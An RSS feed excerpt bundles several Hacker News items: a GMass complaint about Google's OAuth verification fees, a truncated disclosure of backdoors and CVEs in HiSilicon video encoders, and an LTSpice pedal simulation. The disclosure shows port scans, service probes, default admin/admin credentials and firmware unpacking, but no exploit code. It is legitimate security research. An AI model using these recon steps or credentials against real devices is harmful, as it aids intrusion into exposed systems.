<p>This <a href="https://www.theregister.co.uk/2019/02/11/google_gmail_developer/">article from The Register</a>&nbsp;profiles two makers of Gmail apps, Leave Me Alone and Clean Email,&nbsp;and their frustrations with the new requirements.</p>
<p>Even a popular service like <a href="https://help.ifttt.com/hc/en-us/articles/360020249393-Important-update-about-Gmail-on-IFTTT">IFTTT&nbsp;is caving and reducing&nbsp;its Gmail functionality</a>.</p>
<h3>My stance</h3>
<ol>
<li>I’m not happy about it, but given the substantial GMass user base, we’re beginning the process of the security audit. You can follow my <a href="https://www.gmass.co/blog/live-updates-google-oauth-verification-security/">live updates of the OAuth verification process</a>.</li>
<li>I’m&nbsp;a proponent&nbsp;for greater security and protection of user data, but asking software developers to pay the security fee is ludicrous. Google should pay the fee on behalf of its developers (explanation below).</li>
<li>The opportunity is rife for a new email platform to make a dent in Gmail’s marketshare.</li>
<li>Prices for all Gmail apps, including GMass, will rise to cover the cost of the annual security assessment.</li>
<li>Google is grasping for straws when justifying making the developers pay. In response to the question “<b>Why is Google asking apps to pay for the security assessment?” </b>they state, “As we’ve pre-selected industry leading assessors, <strong>the letter of assessment your app will receive can be used for other certifications or customer engagements</strong> where a security assessment is needed.” <em>Gee thanks, Google, for&nbsp;making it easier for us to get more customer engagements.</em></li>
<li>Google’s support for developers who build Gmail apps has been poor, and&nbsp;the manner in which&nbsp;this issue is being handled is being done callously. Questions to the OAuth verification team go unanswered for long periods of time. Stack Overflow is <a href="https://stackoverflow.com/questions/tagged/gmail-api">littered with questions about the Gmail API</a>, mostly which go unanswered, <a href="https://developers.google.com/gmail/api/support">despite Google pointing developers to this area</a>. Google has been playing favorites with<a href="https://gsuite.google.com/marketplace/category/works-with-gmail"> Gmail Add-ons</a>, allowing only some to work on iOS while <a href="https://developers.google.com/gsuite/add-ons/guides/restrictions">claiming that iOS isn’t supported</a>, and not providing any context for its decisions. Additionally, Chrome extensions for Gmail have never been officially sanctioned,&nbsp;although when Gmail launched its new UI last year, it did inform all extension makers of the upcoming changes and provided test accounts. It’s clear that it’s up to developers to solve their own issues and work around Google’s platform shortcomings.</li>
</ol>
<h3>Conflict and Confusion</h3>
<p>There is also conflict and confusion amongst the information released by Google.</p>
<p><strong>Does this process only affect you if your users include gmail.com accounts, or do you have to go through the process even if you just take on G Suite users?</strong></p>
<p>The language in the announcements seem to indicate that&nbsp;this only affects gmail.com consumer accounts wanting access to an app.</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/04/Screenshot-2019-04-30-17.32.31.png" alt="" width="1356" height="234">The&nbsp;use of the word “my”, however, in the question is confusing. It makes the question seem to apply to internal accounts only, those that are owned by the developer of the app. But then the answer references how G Suite administrators can control access, which implies that all external G Suite accounts are included in the group that are not impacted.</p>
<p>In the&nbsp;detailed FAQ about who can skip the review process, one would hope that for consistency with the above that it would say “Those apps that only service G Suite accounts and not consumer gmail.com accounts”&nbsp;but it doesn’t. Hmm.</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/04/Screenshot-2019-04-30-17.34.49.png" alt="" width="1568" height="658"></p>
<p>Further in the FAQ, we find:</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/05/Screenshot-2019-05-01-01.36.05.png" alt="" width="1358" height="294">The first paragraph references “Google Accounts outside of your organization” which I interpret to include G Suite accounts outside of your organization. But then the second paragraph says that if you don’t verify, “access for new users will be disabled” and “existing grants for consumer accounts will be revoked”. I interpret that to mean that no new G Suite nor gmail.com users will be able to OAuth connect to your app, but existing G Suite users will still be able to.</p>
<p>Lastly, there’s this bit:</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/05/Screenshot-2019-05-01-01.37.35.png" alt="" width="1522" height="342">I’m thoroughly confused at this point.</p>
<p><strong>What happens if you choose to not go through the process? Will your app just show “Unverified” on the OAuth consent screen, or will it not have access to certain Gmail API scopes altogether?</strong></p>
<p>The documentation is also unclear on this issue. In the User Data Policy, we find:</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/05/Screenshot-2019-05-01-01.46.43.png" alt="" width="1828" height="478"></p>
<p>but this seems to conflict with what’s shown above:</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/05/Screenshot-2019-05-01-01.36.05.png" alt="" width="1358" height="294"></p>
<p>Finally this text under the “Sensitive Scope Verification” section seems to indicate that the only consequence of not having your app verified is that users will see that it’s Unverified.</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/05/Screenshot-2019-05-01-01.49.53.png" alt="" width="1458" height="488"></p>
<p>However, there’s no equivalent question under the “Restricted Scope Verification” section:</p>
<figure id="attachment_4202" aria-describedby="caption-attachment-4202"><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/05/Screenshot-2019-05-01-01.56.27.png" alt="" width="1534" height="1282"><figcaption id="caption-attachment-4202">They really should include the question: “What happens if I don’t verify my app?”</figcaption></figure>
<p>It would&nbsp;be preferable for the entire developer community if the only consequence of not verifying a sensitive scope app is that users see the “Unverified” designation when connecting their accounts because it allows users to still use their apps. Personally I&nbsp;wouldn’t mind if GMass users go to connect their accounts and see that the app is “unverified”,&nbsp;if it weren’t for the <a href="https://www.dropbox.com/s/v2ipv5oot4qqtwc/Screenshot%202019-05-01%2001.54.43.png?dl=0">100 user cap that is imposed on Unverified Apps</a>. But again, this is only clear for sensitive scope apps and not restricted scope apps.</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/05/Screenshot-2019-05-01-01.54.43.png" alt="" width="1568" height="614"></p>
<h3>The scope of the security audit</h3>
<p>In the <a href="https://support.google.com/cloud/answer/9110914">FAQ</a>, Google states “we are requiring apps that store data on non-Google servers to demonstrate a minimum level of capability in handling data securely and deleting user data upon user request.” But deeper in the FAQ, the&nbsp;audit also includes developer’s code deployment practices, which seems to go beyond a minimal level in capability in handling data securely.</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/05/google-oauth-security-audit-web.png" alt="" width="518" height="1371"><br>
<em>Google is in a position of power over its third party developers.</em> After all, where are the developers going to go? We’ve all invested substantially into building our products, many of us make a living off of what we’ve built, so we if we don’t play by the new rules, it would mark an end to our careers. We could go and build on Outlook.com’s API instead, but with just two players — Google and Microsoft — dominating the email ecosystem, there’s no guarantee that Microsoft won’t implement the same policies. Such is the risk of building a product on top of someone else’s.</p>
<h3>Why Google&nbsp;should pay the fee instead</h3>
<p>They can afford to, and it offers a checks and balances between the security firms and Google that doesn’t exist right now. While developers benefit from building software on top of Gmail, Google too derives benefit from attracting customers to a product that has been made better by all of its third party developers. There are users of Gmail and G Suite that would NOT be users if it weren’t for their loyalty to a particular third party app. I know for certain that in GMass’s case, we’ve&nbsp;brought users to G Suite because they wanted to use GMass.</p>
<h3>Resources on&nbsp;the new Google OAuth scope policy</h3>
<p>Google’s <a href="https://cloud.google.com/blog/products/g-suite/elevating-user-trust-in-our-api-ecosystems">original announcement</a> <span>(cloud.google.com)</span>.</p>
<p>The <a href="https://developers.google.com/terms/api-services-user-data-policy">user data policy</a> <span>(developers.google.com)</span>.</p>
<p>Detailed <a href="https://support.google.com/cloud/answer/9110914?hl=en&amp;ref_topic=3473162">FAQ</a> on the verification process and the security assessment <span>(support.google.com)</span>.</p>
<p>Indie Hackers <a href="https://www.indiehackers.com/forum/psa-new-google-policy-creates-15k-barrier-to-entry-for-apps-using-the-gmail-api-08070e6e4c">discussion</a> of the issue <span>(indiehackers.com)</span>.</p>
<p><a href="https://groups.google.com/forum/#!topic/inboxsdk/6NLvQL-5bic">Inbox SDK discussion</a> on the issue <span>(groups.google.com)</span>.</p>
<div itemtype="http://schema.org/Person" itemscope="" itemprop="author"><p><img alt="" src="https://secure.gravatar.com/avatar/836da7a343d034a72cb44fb28580efe6?s=100&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/836da7a343d034a72cb44fb28580efe6?s=200&amp;d=mm&amp;r=g 2x" height="100" width="100" itemprop="image"></p><div><p>Ajay is the founder of GMass and has been developing email sending software for 20 years.</p></div></div></div><!-- .entry-content -->

	<!-- <footer class="entry-footer"> -->
			<!-- </footer> -->

</article></div>]]>
            </description>
            <link>https://www.gmass.co/blog/google-oauth-verification-security-assessment/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24516706</guid>
            <pubDate>Fri, 18 Sep 2020 13:47:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Backdoors and other vulnerabilities in HiSilicon based hardware video encoders]]>
            </title>
            <description>
<![CDATA[
Score 185 | Comments 62 (<a href="https://news.ycombinator.com/item?id=24516453">thread link</a>) | @blablablub
<br/>
September 18, 2020 | https://kojenov.com/2020-09-15-hisilicon-encoder-vulnerabilities/ | <a href="https://web.archive.org/web/*/https://kojenov.com/2020-09-15-hisilicon-encoder-vulnerabilities/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
  
  <p><span>15 Sep 2020</span></p><p><img src="https://kojenov.com/assets/2020-09-15-encoders/010-title-bug.png" alt="bug"></p>

<hr>

<p><strong>Update 2020-09-17:</strong> Huawei <a href="https://www.huawei.com/en/psirt/security-notices/2020/huawei-sn-20200917-01-hisilicon-en">issued a statement</a> saying that none of the vulnerabilities have been introduced by HiSilicon chips and SDK packages. I will update this article as more information comes in.</p>

<hr>

<p>This article discloses critical vulnerabilities in IPTV/H.264/H.265 video encoders based on HiSilicon hi3520d hardware. The vulnerabilities exist in the application software running on these devices. All vulnerabilities are exploitable remotely and can lead to sensitive information exposure, denial of service, and remote code execution resulting in full takeover of the device. With multiple vendors affected, and no complete fixes at the time of the publication, these encoders should only be used on fully trusted networks behind firewalls. I hope that my detailed write-up serves as a guide for more security research in the IoT world.</p>

<!--more-->

<ul id="markdown-toc">
  <li><a href="#summary" id="markdown-toc-summary">Summary</a></li>
  <li><a href="#background" id="markdown-toc-background">Background</a></li>
  <li><a href="#hardware" id="markdown-toc-hardware">Hardware</a></li>
  <li><a href="#network-recon" id="markdown-toc-network-recon">Network recon</a>    <ul>
      <li><a href="#23---telnet" id="markdown-toc-23---telnet">23 - telnet</a></li>
      <li><a href="#80-8086---web-application" id="markdown-toc-80-8086---web-application">80, 8086 - web application</a></li>
      <li><a href="#554-8554---rtsp" id="markdown-toc-554-8554---rtsp">554, 8554 - RTSP</a></li>
      <li><a href="#1935---rtmp" id="markdown-toc-1935---rtmp">1935 - RTMP</a></li>
      <li><a href="#5150---serial-to-tcp" id="markdown-toc-5150---serial-to-tcp">5150 - serial to TCP</a></li>
      <li><a href="#9588---another-web-server" id="markdown-toc-9588---another-web-server">9588 - another web server</a></li>
    </ul>
  </li>
  <li><a href="#firmware-analysis" id="markdown-toc-firmware-analysis">Firmware analysis</a>    <ul>
      <li><a href="#content" id="markdown-toc-content">Content</a></li>
      <li><a href="#password-file-and-telnet-access" id="markdown-toc-password-file-and-telnet-access">Password file and telnet access</a></li>
    </ul>
  </li>
  <li><a href="#local-recon" id="markdown-toc-local-recon">Local recon</a>    <ul>
      <li><a href="#the-base-system" id="markdown-toc-the-base-system">The base system</a></li>
      <li><a href="#processes" id="markdown-toc-processes">Processes</a></li>
      <li><a href="#ports" id="markdown-toc-ports">Ports</a></li>
      <li><a href="#dumping-the-file-system" id="markdown-toc-dumping-the-file-system">Dumping the file system</a></li>
    </ul>
  </li>
  <li><a href="#reverse-engineering" id="markdown-toc-reverse-engineering">Reverse engineering</a>    <ul>
      <li><a href="#modifying-the-boot" id="markdown-toc-modifying-the-boot">Modifying the boot</a></li>
      <li><a href="#remote-debugging" id="markdown-toc-remote-debugging">Remote debugging</a></li>
      <li><a href="#decompiling" id="markdown-toc-decompiling">Decompiling</a></li>
    </ul>
  </li>
  <li><a href="#vulnerabilities-and-exploits" id="markdown-toc-vulnerabilities-and-exploits">Vulnerabilities and exploits</a>    <ul>
      <li><a href="#backdoor-password-cve-2020-24215" id="markdown-toc-backdoor-password-cve-2020-24215">Backdoor password (CVE-2020-24215)</a></li>
      <li><a href="#root-access-via-telnet-cve-2020-24218" id="markdown-toc-root-access-via-telnet-cve-2020-24218">root access via telnet (CVE-2020-24218)</a></li>
      <li><a href="#arbitrary-file-disclosure-via-path-traversal-cve-2020-24219" id="markdown-toc-arbitrary-file-disclosure-via-path-traversal-cve-2020-24219">Arbitrary file disclosure via path traversal (CVE-2020-24219)</a></li>
      <li><a href="#unauthenticated-file-upload-cve-2020-24217" id="markdown-toc-unauthenticated-file-upload-cve-2020-24217">Unauthenticated file upload (CVE-2020-24217)</a></li>
      <li><a href="#arbitrary-code-execution-by-uploading-malicious-firmware" id="markdown-toc-arbitrary-code-execution-by-uploading-malicious-firmware">Arbitrary code execution by uploading malicious firmware</a></li>
      <li><a href="#arbitrary-code-execution-via-command-injection" id="markdown-toc-arbitrary-code-execution-via-command-injection">Arbitrary code execution via command injection</a></li>
      <li><a href="#buffer-overflow-definite-dos-and-potential-rce-cve-2020-24214" id="markdown-toc-buffer-overflow-definite-dos-and-potential-rce-cve-2020-24214">Buffer overflow: definite DoS and potential RCE (CVE-2020-24214)</a></li>
      <li></li>
    </ul>
  </li>
  <li><a href="#disclosure" id="markdown-toc-disclosure">Disclosure</a>    <ul>
      <li><a href="#affected-vendors" id="markdown-toc-affected-vendors">Affected vendors</a></li>
      <li><a href="#coordinated-disclosure" id="markdown-toc-coordinated-disclosure">Coordinated disclosure</a></li>
      <li><a href="#remediation" id="markdown-toc-remediation">Remediation</a></li>
    </ul>
  </li>
  <li><a href="#conclusion" id="markdown-toc-conclusion">Conclusion</a></li>
  <li><a href="#exploit-demos" id="markdown-toc-exploit-demos">Exploit demos</a></li>
  <li><a href="#exploit-scripts" id="markdown-toc-exploit-scripts">Exploit scripts</a></li>
  <li><a href="#links" id="markdown-toc-links">Links</a></li>
</ul>

<h2 id="summary">Summary</h2>

<p>The following vulnerabilities were identified:</p>

<ul>
  <li>Critical
    <ul>
      <li>Full admin interface access via backdoor password (CVE-2020-24215)</li>
      <li>root access via telnet (CVE-2020-24218)</li>
      <li>Arbitrary file disclosure via path traversal (CVE-2020-24219)</li>
      <li>Unauthenticated file upload (CVE-2020-24217)
        <ul>
          <li>Arbitrary code execution via malicious firmware upload</li>
          <li>Arbitrary code execution via command injection</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>High
    <ul>
      <li>Denial of service via buffer overflow (CVE-2020-24214)</li>
    </ul>
  </li>
  <li>Medium
    <ul>
      <li>Unauthorized RTSP video stream access (CVE-2020-24216)</li>
    </ul>
  </li>
</ul>

<p>See <a href="https://www.kb.cert.org/vuls/id/896979">CERT/CC vulnerability note VU#896979</a></p>

<p>During my research I had physical access to several devices from the following vendors: <a href="http://szuray.com/">URayTech</a>, <a href="https://jtechdigital.com/product/jtech-ench4-0220/">J-Tech Digital</a>, and <a href="https://www.provideoinstruments.com/iptv-encoders">Pro Video Instruments</a>. I performed my research initially on URayTech, then confirmed vulnerabilities in the other two vendors.</p>

<p>There is at least a dozen of different vendors that manufacture and sell very similar devices. By analyzing product documentation and firmware update packages, I’ve got a high level of confidence those devices were also affected by most, if not all, vulnerabilities listed here. Here is an [incomplete] list of these additional vendors: <a href="http://www.networktechinc.com/h264-hdmi-encoder.html"><em>Network Technologies Incorporated (NTI)</em></a>, <a href="https://www.oupree.com/IP-Video-Encoder-Decoder/"><em>Oupree</em></a>, <a href="http://www.szmine.com/Video_Encoder/"><em>MINE Technology</em></a>, <a href="https://www.blankom.de/products/irenis-ip-encoder-streamer/"><em>Blankom</em></a>, <a href="https://www.iseevy.com/product-category/video-encoder/"><em>ISEEVY</em></a>, <a href="https://www.orivision.com.cn/c/h264-hdmi-encoder_0017"><em>Orivision</em></a>, <a href="https://www.procoderhd.com/">WorldKast/procoder</a>, <a href="http://www.digicast.cn/en/product.asp?pType=222">Digicast</a></p>

<p>It is my understanding that most of these devices are intended to be used behind NAT/firewall. However, I was able to utilize <a href="http://shodan.io/">shodan.io</a> to identify several hundred devices on the public internet, all likely to be exploitable by an anonymous remote attacker.</p>

<h2 id="background">Background</h2>

<p>Hardware video encoders are used for video streaming over IP networks. They convert raw video signals (such as analog, SDI, HDMI) to H.264 or H.265 streams and send them to a video distribution network (YouTube, Twitch, Facebook,…) or let the users watch the video directly via RTSP, HLS, etc. Normally, these encoders have a web interface to allow the administrator to configure networking, encoding parameters, streaming options, and so on. Many such devices on the market today are based on <a href="http://www.hisilicon.com/en/">HiSilicon</a> (a Huawei brand) hi3520d ARM SoC running a special Linux distribution called HiLinux, with a set of user-space utilities and a custom web application on top.</p>

<p>Security research on HiSilicon devices has been done in the past. Here are some existing publications:</p>

<ul>
  <li><a href="https://habr.com/ru/post/173501/">Root shell in IP cameras</a> (in Russian) by Vladislav Yarmak, 2013. The research uncovered the root password allowing root shell access over telnet.</li>
  <li><a href="https://github.com/tothi/pwn-hisilicon-dvr">HiSilicon DVR hack</a> by Istvan Toth, 2017. This research targeted DVR/NVR devices, and uncovered a root shell access with elevated privileges, a backdoor password, a file disclosure via path traversal, and an exploitable buffer overflow.</li>
  <li><a href="https://habr.com/en/post/486856/">Full disclosure: 0day vulnerability (backdoor) in firmware for Xiaongmai-based DVRs, NVRs and IP cameras</a> by Vladislav Yarmak. This research uncovered a very interesting “port knocking” backdoor allowing a remote attacker to start the telnet, and then log in with one of the several known passwords.</li>
</ul>

<p>While the streaming video encoders may share the same hardware architecture and the underlying Linux system with the above devices, my research targets the <strong>admin web application specific to the video encoders</strong> and does not overlap with the prior work.</p>

<h2 id="hardware">Hardware</h2>

<p>Here is a few pictures of one of the devices I had an opportunity to test.
<img src="https://kojenov.com/assets/2020-09-15-encoders/050-encoder.jpg" alt="hardware">
Physical ports
<img src="https://kojenov.com/assets/2020-09-15-encoders/060-encoder.jpg" alt="hardware">
Top cover off. The right side, from top to bottom: LAN, HDMI out, reset, HDMI in, LEDs, audio in
<img src="https://kojenov.com/assets/2020-09-15-encoders/070-encoder.jpg" alt="hardware">
Let’s plug this thing in, connect to network, and start exploring!</p>

<h2 id="network-recon">Network recon</h2>

<p>A simple <code>nmap</code> scan reports the following open ports:</p>

<div><div><pre><code>$ nmap -p 1-65535 encoder
...
PORT     STATE SERVICE
23/tcp   open  telnet
80/tcp   open  http
554/tcp  open  rtsp
1935/tcp open  rtmp
5150/tcp open  atmp
8086/tcp open  d-s-n
8554/tcp open  rtsp-alt
9588/tcp open  unknown
</code></pre></div></div>

<h3 id="23---telnet">23 - telnet</h3>

<p>Telnet displays the login prompt, but the password is unknown at this point:</p>



<h3 id="80-8086---web-application">80, 8086 - web application</h3>

<p>Both ports serve the main admin web interface. The default credentials are <strong>admin/admin</strong>
<img src="https://kojenov.com/assets/2020-09-15-encoders/110-login.png" alt="login"></p>

<p>The login prompt suggests basic HTTP authentication, but this is actually <a href="https://en.wikipedia.org/wiki/Digest_access_authentication">digest authentication</a>. The following header is returned by the application:</p>

<div><div><pre><code>WWW-Authenticate: Digest qop="auth", ...
</code></pre></div></div>

<p>and the browser authenticates with:</p>

<div><div><pre><code>Authorization: Digest username="admin", ...
</code></pre></div></div>

<p>(as I will demonstrate below, digest is not the only authentication method supported by the application)</p>

<p>After logging in, the user sees a simple web interface.
<img src="https://kojenov.com/assets/2020-09-15-encoders/120-status.png" alt="status"></p>

<p>Note that vendors customize the interface, and your device can display something completely different, such as:
<img src="https://kojenov.com/assets/2020-09-15-encoders/130-status.png" alt="status">However, the underlying functionality (the web API calls) are all the same regardless of the UI.</p>

<p>There are several sections where the administrator can perform various tasks such as setting up the network, adjusting encoder parameters, uploading images to overlay the video, upgrading the firmware, and so on.</p>

<h3 id="554-8554---rtsp">554, 8554 - RTSP</h3>

<p>RTSP stands for <a href="https://en.wikipedia.org/wiki/Real_Time_Streaming_Protocol">Real Time Streaming Protocol</a>. If it’s enabled, one can watch the video stream directly from the encoder.</p>

<div><div><pre><code>$ curl -i rtsp://encoder:554
RTSP/1.0 200 OK
CSeq: 1
Server: Server Version 9.0.6
Public: OPTIONS, DESCRIBE, PLAY, SETUP, SET_PARAMETER, GET_PARAMETER, TEARDOWN
</code></pre></div></div>

<h3 id="1935---rtmp">1935 - RTMP</h3>

<p><a href="https://en.wikipedia.org/wiki/Real-Time_Messaging_Protocol">Real Time Messaging Protocol</a>, another way to deliver video</p>

<h3 id="5150---serial-to-tcp">5150 - serial to TCP</h3>

<p>Mysterious service. <code>netcat</code> connects but the server does not seem to react to any input</p>

<div><div><pre><code>$ nc -v encoder 5150
Connection to encoder 5150 port [tcp/*] succeeded!
foo
bar
...
</code></pre></div></div>

<p>This initially puzzled me, but when playing with devices from other vendors I noticed that some firmwares allowed control over this port:
<img src="https://kojenov.com/assets/2020-09-15-encoders/140-serial.png" alt="serial"></p>

<h3 id="9588---another-web-server">9588 - another web server</h3>

<p>This one is <code>nginx</code>, but not exactly clear what it is for.</p>

<div><div><pre><code>$ curl -i http://encoder:9588
HTTP/1.1 200 OK
Server: nginx/1.6.0
Date: Thu, 22 Mar 2018 14:28:13 GMT
Content-Type: text/html
Content-Length: 612
Last-Modified: Wed, 05 Dec 2018 10:58:31 GMT
Connection: keep-alive
ETag: "5c07af57-264"
Accept-Ranges: bytes

&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;Welcome to nginx!&lt;/title&gt;
...
</code></pre></div></div>

<h2 id="firmware-analysis">Firmware analysis</h2>

<p>Clicking around the web interface, I noticed the backup feature:
<img src="https://kojenov.com/assets/2020-09-15-encoders/150-backup.png" alt="backup">
I immediately went ahead and backed up (i.e. downloaded) both the firmware and the configuration.</p>

<h3 id="content">Content</h3>

<p>The firmware backup is a RAR archive that can be easily unpacked:</p>

<div><div><pre><code>$ file up.rar
up.rar: RAR archive data, v4, os: Win32

$ mkdir up
$ cd up
$ unrar ../up.rar
...
</code></pre></div></div>

<p>Here is the directory structure:</p>

<div><div><pre><code>$ tree -d
.
├── disk
├── ko
│   └── extdrv
├── lib
├── nginx
│   ├── conf
│   ├── html
│   ├── logs
│   └── sbin
└── web
    ├── css
    ├── images
    ├── js
    └── player
        └── icons
</code></pre></div></div>

<ul>
  <li><code>disk</code>: empty</li>
  <li><code>ko</code>: kernel modules (device drivers)</li>
  <li><code>lib</code>: empty</li>
  <li><code>nginx</code>: nginx executables and configuration</li>
  <li><code>web</code>: static content (html, js, css…)</li>
</ul>

<p>The most important things are in the root of the archive:</p>

<div><div><pre><code>$ ls -l
total 12756
-rw------- 1 root root     307 Jul 14 08:31 box.ini
-rw------- 1 root root 6533364 Jul 14 08:31 box.v400_hdmi
drwx------ 2 root root    4096 Jul 14 08:31 disk
-rw------- 1 root root 2972924 Jul 14 08:31 font.ttf
-rw------- 1 root root 1570790 Jul 14 08:31 hostapd
-rw------- 1 root root    1847 Jul 14 08:31 hostapd.conf
drwx------ 3 root root    4096 Jul 14 08:31 ko
drwx------ 2 root root    4096 Jul 14 08:31 lib
drwx------ 6 root root    4096 Jul 14 08:31 nginx
-rw------- 1 root root 1382400 Jul 14 08:31 nosig.yuv
-rw------- 1 root root      38 Jul 14 08:31 passwd
-rw------- 1 root root  211248 Jul 14 08:31 png2bmp
-rw------- 1 root root   19213 Jul 14 08:30 remserial
-rw------- 1 root root    6624 Jul 14 08:30 reset
-rw------- 1 root root     968 Jul 14 08:30 run
-rw------- 1 root root     878 Jul 14 08:30 udhcpc.script
-rw------- 1 root root     191 Jul 14 08:30 udhcpd.conf
drwx------ 6 root root    4096 Jul 14 08:31 web
-rw------- 1 root root   39166 Jul 14 08:31 wpa_cli
-rw------- 1 root root  264069 Jul 14 08:31 wpa_supplicant
</code></pre></div></div>

<p>In addition to some general utilities ( <code>hostapd</code>, <code>png2bmp</code>, <code>remserial</code>, <code>wpa_cli</code>, <code>wpa_supplicant</code>) it contains the custom web application <code>box.v400_hdmi</code> which is a compiled binary:</p>

<div><div><pre><code>$ file box.v400_hdmi 
box.v400_hdmi: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
</code></pre></div></div>

<p><strong>This executable is the primary target of my research, and …</strong></p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://kojenov.com/2020-09-15-hisilicon-encoder-vulnerabilities/">https://kojenov.com/2020-09-15-hisilicon-encoder-vulnerabilities/</a></em></p>]]>
            </description>
            <link>https://kojenov.com/2020-09-15-hisilicon-encoder-vulnerabilities/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24516453</guid>
            <pubDate>Fri, 18 Sep 2020 13:26:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Simulating the ProCo Rat Distortion Pedal in LTSpice]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24516227">thread link</a>) | @cushychicken
<br/>
September 18, 2020 | http://cushychicken.github.io/ltspice-proco-rat/ | <a href="https://web.archive.org/web/*/http://cushychicken.github.io/ltspice-proco-rat/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>It’s been a long time since I’ve done <a href="http://cushychicken.github.io/posts/ltspice-tube-screamer/">a pedal simulation</a>, and, well, quarantine times are as good a time as any to fill time with LTSpice simulation. Since Radiohead is a too-appropirate soundtrack for the time in which we live, and Thom Yorke is a famous user, why not simulate the ProCO RAT distortion pedal?</p><p>If you’d like to follow along at home, I’ve put <a href="https://github.com/Cushychicken/ltspice-guitar-pedals/tree/master/proco-rat-distortion">the LTSpice file on GitHub</a>. Find any errors? Got any neat mods you’d like to include? Please, submit a pull request!</p><p>You may need to rustle up a diode model for the 1N914 to run - it is not one of the models included in the LTSpice install.</p><p>Here’s the whole schematic, labeled for clarity:</p><p><img src="http://cushychicken.github.io/assets/images/proco_rat_whole_schematic" alt="Whole Schematic"></p><p>The interesting stuff is largely concentrated in the clipping, tone, and output stages.</p><p>The clipping stage is formed by a LM308 opamp in a noninverting configuration. R2 biases the input at 4.5[V] for maximum dynamic range in the opamp output - i.e., halfway between the 9V rail and GND. Feedback gain is set by potentiometer R9. When shorted to 0[ohm], it reduces the clipping stage to a simple opamp follower (gain=1). When set to a maximum, gain of the amp in signal bands is: \(Gain = 1 + \frac{Rgain}{(560 || 47)} = ~2300 [V/V] = ~67[dB]\) This is more than enough gain to drive to the opamp rail for even a gentle input signal. Fed raw into a guitar amplifier, this signal would completely saturate the input. That’s where the D2/D3 diode clipping pair come in to play. (Note, though, that the input saturation is desirable to some users. A common modification to this pedal is to remove D2/D3, and rely solely on opamp clipping. This yields a volume boost, and crunchier tone.)</p><p><img src="http://cushychicken.github.io/assets/images/Image-1600433482578.png" alt="Clipping Stage"></p><p>The AC coupling network of C10/R10 works to shift the signal back to a DC balanced square wave. D2/D3 serve to clip the signal down to a more modest +/-0.65[V].</p><p><img src="http://cushychicken.github.io/assets/images/Image-1600433524694.png" alt="Input vs Opamp Output vs Clipping Diodes"></p><p>This is slightly more interesting when you move into the frequency domain, however. The net effect, as the gain increases, is to emphasize the 1kHz band of the guitar - ideally, to cut through the mix of a band. (A rock band, that is - not a frequency band.)</p><p><img src="http://cushychicken.github.io/assets/images/Image-1600433598206.png" alt="Image"></p><p>Note that all of these traces converge to the same rolloff asymptote. That’s the limitation imposed by the LM308’s output slew rate. At higher gain, the opamp can’t switch any faster, which limits the response of higher frequencies as the gain increases.</p><p>The tone control is remarkably simple - just a first order RC filter, with potentiometer R17 to allow the user to set the rolloff frequency.</p><p><img src="http://cushychicken.github.io/assets/images/Image-1600433644991.png" alt="Tone RC Filter"></p><p>R15 and C11 set a limit of the RC filter of the tone stage at about 32kHz. Increasing pot R17 moves that corner frequency lower and lower, until bottoming out at 475Hz. This filter effectively smooths the square wave into progressively softer edges. As R17 increases, the transitions get less square, and closer to a triangular wave.</p><p><img src="http://cushychicken.github.io/assets/images/Image-1600433664315.png" alt="Image"></p><p>This is my estimate of who lies where on the tone curve, based on a subset of <a href="https://en.wikipedia.org/wiki/Pro_Co_RAT#Notable_users">Wikipedia’s list of RAT users</a>:</p><p><img src="http://cushychicken.github.io/assets/images/Image-1600433692230.png" alt="Clipping vs Users"></p><p>The output driver is also relatively simple - just a JFET follower, with a simple RC filter serving as a highpass filter for volume control. As R14 decreases in resistance, so does the output volume.</p><p><img src="http://cushychicken.github.io/assets/images/Image-1600433718430.png" alt="Image"></p><ul><li>Increasing the compensation capacitor of the LM308 opamp (C1 in our schematic) has some interesting properties. Increasing this to 300pF creates a softer transition to the opamp railing out, which yields an overall softer clip - fewer higher harmonics. An alternative design, for a less harsh clip.</li><li>Increasing the compensation cap higher proves problematic - or interesting, depending on your viewpoint. Increasing C1 to 3nF yields a gentle oscillation in the opamp output. This could make for some wacky mixed frequency effects. Might be a fun thing to wire up and see what happens.</li><li>Different diodes for D2/D3 could also change the clipping profile, and the harshness of the clip.</li></ul><p><a href="https://www.electrosmash.com/proco-rat">ElectroSmash</a>, of course, is the vanguard of guitar pedal EE knowhow. I used their page of schematics and simulation output as a sanity check that I got all of this right.</p><p>You can see the slew rate limitation of the LM308 in <a href="https://www.analog.com/media/en/technical-documentation/data-sheets/lt0108.pdf">the datasheet</a>. Gain/bandwidth product is on page 4, under “Open Loop Frequency Response”.</p></div></div>]]>
            </description>
            <link>http://cushychicken.github.io/ltspice-proco-rat/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24516227</guid>
            <pubDate>Fri, 18 Sep 2020 13:06:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Digital banking, now halal]]>
            </title>
            <description>
<![CDATA[
Score 53 | Comments 82 (<a href="https://news.ycombinator.com/item?id=24516141">thread link</a>) | @jbegley
<br/>
